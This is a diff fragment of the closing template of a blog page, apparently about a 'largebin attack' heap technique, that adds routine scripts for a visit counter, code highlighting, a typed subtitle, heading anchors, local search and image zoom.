+      if ($('.toc-list-item').length > 0) {
+        $('#toc > p').css('visibility', 'visible');
+      }
+      var offset = $('#board-ctn').css('margin-right')
+      $('#toc-ctn').css({
+        'right': offset
+      })
+    });
+  </script>
 
 
 
 
-  
 
-  
 
-  
 
-  
+  <script defer src="//busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script>
 
-  
 
-  
 
-  
 
-  
+<!-- Plugins -->
 
-  
 
-  
 
-  
+  <script src="https://cdn.staticfile.org/prettify/188.0.0/prettify.min.js"></script>
+  <script>
+    $(document).ready(function () {
+      $('pre').addClass('prettyprint  linenums');
+      prettyPrint();
+    })
+  </script>
 
-  
 
-  
 
-  
+  <script src="https://cdn.staticfile.org/typed.js/2.0.11/typed.min.js"></script>
+  <script>
+    var typed = new Typed('#subtitle', {
+      strings: [
+        '  ',
+        "largebin attack&nbsp;",
+      ],
+      cursorChar: "_",
+      typeSpeed: 70,
+      loop: false,
+    });
+    typed.stop();
+    $(document).ready(function () {
+      $(".typed-cursor").addClass("h2");
+      typed.start();
+    });
+  </script>
+
+
+
+  <script src="https://cdn.staticfile.org/anchor-js/4.2.2/anchor.min.js"></script>
+  <script>
+    anchors.options = {
+      placement: "right",
+      visible: "hover",
+      
+    };
+    var el = "h1,h2,h3,h4,h5,h6".split(",");
+    var res = [];
+    for (item of el) {
+      res.push(".markdown-body > " + item)
+    }
+    anchors.add(res.join(", "))
+  </script>
+
+
+
+  <script src="/js/local-search.js"></script>
+  <script>
+    var path = "/local-search.xml";
+    var inputArea = document.querySelector("#local-search-input");
+    inputArea.onclick = function () {
+      getSearchFile(path);
+      this.onclick = null
+    }
+  </script>
+
+
+
+  <script src="https://cdn.staticfile.org/fancybox/3.5.7/jquery.fancybox.min.js"></script>
+  <script>
+    $("#post img:not(.no-zoom img, img[no-zoom])").each(
+      function () {
+        var element = document.createElement("a");
+        $(element).attr("data-fancybox", "images");
+        $(element).attr("href", $(this).attr("src"));
+        $(this).wrap(element);
+      }
+    );
+  </script>
+
+
+
+
+
+
+
+
+
+
+
 
 </body>
 </html>
